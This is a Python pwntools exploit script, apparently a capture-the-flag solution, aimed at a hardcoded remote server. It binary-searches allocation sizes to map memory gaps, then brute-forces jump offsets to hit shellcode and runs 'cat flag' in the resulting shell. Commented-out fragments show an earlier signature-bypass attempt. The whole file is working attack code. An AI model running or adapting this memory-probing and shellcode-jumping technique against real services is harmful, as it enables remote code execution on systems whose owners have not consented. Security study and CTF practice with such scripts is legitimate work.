#!/usr/bin/python

from pwn import *
local = False

def get_conn():
	if local:
		return remote("localhost", 1234)
	else:
		return remote("54.202.7.144", 6969)

def allocate(amt):
	print "trying " + amt
	my_conn = get_conn()


	# this is a different big gap
	# print my_conn.recvuntil("[a]lloc, [j]ump :")
	# my_conn.sendline("a")
	# print my_conn.recvuntil("sz?")
	# my_conn.sendline(hex(0x45596af05b1f))
	# my_conn.sendline("n")

	# # this is a different big gap
	# print my_conn.recvuntil("[a]lloc, [j]ump :")
	# my_conn.sendline("a")
	# print my_conn.recvuntil("sz?")
	# my_conn.sendline(hex(0x298eb53a7fe8))
	# my_conn.sendline("n")

	# # this is a different big gap
	# print my_conn.recvuntil("[a]lloc, [j]ump :")
	# my_conn.sendline("a")
	# print my_conn.recvuntil("sz?")
	# my_conn.sendline(hex(0x154176459fe6))
	# my_conn.sendline("n")

	# # this is a different big gap
	# print my_conn.recvuntil("[a]lloc, [j]ump :")
	# my_conn.sendline("a")
	# print my_conn.recvuntil("sz?")
	# my_conn.sendline(hex(0x92a7bd1fe8)) #0x2fc6806e0
	# my_conn.sendline("n")

	print my_conn.recvuntil("[a]lloc, [j]ump :")
	my_conn.sendline("a")
	print my_conn.recvuntil("sz?")
	my_conn.sendline(amt)
	r =  my_conn.recv() + my_conn.recv()

	print r
	print r
	print r
	print r
	if "free" in r:
		my_conn.sendline("y")
		my_conn.close()
		return True
	else:
		my_conn.close()
		return False

def jmp(amt):
	print "trying " + amt
	my_conn = get_conn()
	print my_conn.recvuntil("[a]lloc, [j]ump :")
	my_conn.sendline("j")
	print my_conn.recvuntil("sz?")
	my_conn.sendline(amt)
	my_conn.sendline("cat flag; echo 'lolz'")
	r =  my_conn.recv() + my_conn.recv() + my_conn.recv()
	my_conn.close()
	return r

# 	my_conn = get_conn()
# 	my_conn.recvuntil(">_")
# 	my_conn.sendline("2")
# 	my_conn.recvuntil("what command do you want to run?")
# 	my_conn.sendline(cmd)
# 	my_conn.recvuntil("gimme signature:")
# 	my_conn.sendline(sig)
# 	c = "1) sign command"
# 	resp = my_conn.recvuntil(c)[:-len(c)] # get rid of the menu bit
# 	my_conn.close()
# 	return resp

# iterate to get differnet hash values
# fill the buffer with 'A's so that when it null terminates
# it actually sets use_md5 to 0
# which will happen after we get the extra byte override pointer
# s = 0x430140eaf4e2# 0x140eab4e2
# 	# 0x140eab562
# a = 0x100000000
# # for x in range(10000):
# print hex(s + a)
# while allocate(hex(s + a)):
# 	print 'going higher'
# 	a *= 2
# print "failed at "
# print hex(a)

# 0x43a21e7a6fe7



# 0x265a99ddf000
# 0x2d004db20fe8

# 0x43f7d87fafe8

def find_next():
	low =  0x0
	high = 0x5d004db30000
	mid = (high + low)/2
	while low != mid:
		print hex(low)
		print hex(mid)
		print hex(high)
		if allocate(hex(mid)):
			low = mid
			print "goig higher" 
		else:
			high = mid
			print "loarrr"
		mid = (high + low)/2




	print hex(low)
	print hex(mid)
	return high

high = find_next()
# high = 0x298eb53a7fe8
# print hex(mid)
# print hex(mid)

 # 0x50ad1506c000
	# 0x13f746d05
	# 0x13f683a4c
	# 0x13f4fd4d9
	# 0x13f409571


 # 0x18290a448000
 	# 0x13f787dee

 # 0x411ef5833000
# print jmp(hex(0x265a99ddf000))
print "STARTING TO TRY AND HIT SHELLCODE"
resp = "asf"
ps = 0x0fff
a = -1
m = 0x10000
while 'lolz' not in resp:
	try:
		resp = jmp(hex(high + a*ps + m))
		break
	except:
		pass
	print a
	print resp

	a +=1 

print resp


# 0x2d004db20fe8
# 0x43a21e7a6fe8



# 0x50ad1506c000




#        0x140eab522
#         0x10000000
# 0x000044f13e0f8000
# distance 0x44effd24cade




# 0x1e093c6c8000


